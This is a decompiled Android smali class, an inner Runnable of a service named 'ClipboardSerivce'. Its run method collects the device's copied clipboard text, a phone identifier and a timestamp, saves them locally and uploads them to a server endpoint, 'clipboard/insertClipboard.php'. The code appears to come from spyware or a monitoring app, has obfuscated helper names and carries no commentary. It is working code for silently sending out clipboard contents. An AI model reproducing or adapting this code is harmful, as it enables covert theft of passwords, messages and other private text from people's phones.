.class final Lcom/app/service/ClipboardSerivce$2;
.super Ljava/lang/Object;
.source "ClipboardSerivce.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/app/service/ClipboardSerivce;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field private synthetic a:Ljava/lang/String;

.field private synthetic b:Lcom/app/service/ClipboardSerivce;


# direct methods
.method constructor <init>(Lcom/app/service/ClipboardSerivce;Ljava/lang/String;)V
    .locals 0

    .line 68
    iput-object p1, p0, Lcom/app/service/ClipboardSerivce$2;->b:Lcom/app/service/ClipboardSerivce;

    iput-object p2, p0, Lcom/app/service/ClipboardSerivce$2;->a:Ljava/lang/String;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public final run()V
    .locals 5

    .line 72
    :try_start_0
    invoke-static {}, Ler;->e()Ljava/text/SimpleDateFormat;

    move-result-object v0

    .line 74
    new-instance v1, Ljava/util/Date;

    invoke-direct {v1}, Ljava/util/Date;-><init>()V

    invoke-virtual {v0, v1}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v0

    .line 76
    new-instance v1, Ljava/util/HashMap;

    invoke-direct {v1}, Ljava/util/HashMap;-><init>()V

    const-string v2, "idPhone"

    .line 77
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v4, p0, Lcom/app/service/ClipboardSerivce$2;->b:Lcom/app/service/ClipboardSerivce;

    invoke-virtual {v4}, Lcom/app/service/ClipboardSerivce;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    invoke-static {v4}, Lda;->f(Landroid/content/Context;)I

    move-result v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v2, "copiedText"

    .line 78
    iget-object v3, p0, Lcom/app/service/ClipboardSerivce$2;->a:Ljava/lang/String;

    invoke-virtual {v1, v2, v3}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v2, "date"

    .line 79
    invoke-virtual {v1, v2, v0}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 81
    iget-object v2, p0, Lcom/app/service/ClipboardSerivce$2;->a:Ljava/lang/String;

    iget-object v3, p0, Lcom/app/service/ClipboardSerivce$2;->b:Lcom/app/service/ClipboardSerivce;

    invoke-virtual {v3}, Lcom/app/service/ClipboardSerivce;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-static {v2, v0, v3}, Lu;->b(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)J

    move-result-wide v2

    const-string v0, "clipboard/insertClipboard.php"

    .line 83
    invoke-static {v0, v1}, Lcv;->a(Ljava/lang/String;Ljava/util/Map;)Z

    move-result v0

    if-eqz v0, :cond_0

    long-to-int v0, v2

    .line 84
    iget-object v1, p0, Lcom/app/service/ClipboardSerivce$2;->b:Lcom/app/service/ClipboardSerivce;

    invoke-virtual {v1}, Lcom/app/service/ClipboardSerivce;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-static {v0, v1}, Lu;->i(ILandroid/content/Context;)Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    :cond_0
    return-void

    :catch_0
    move-exception v0

    .line 87
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    return-void
.end method
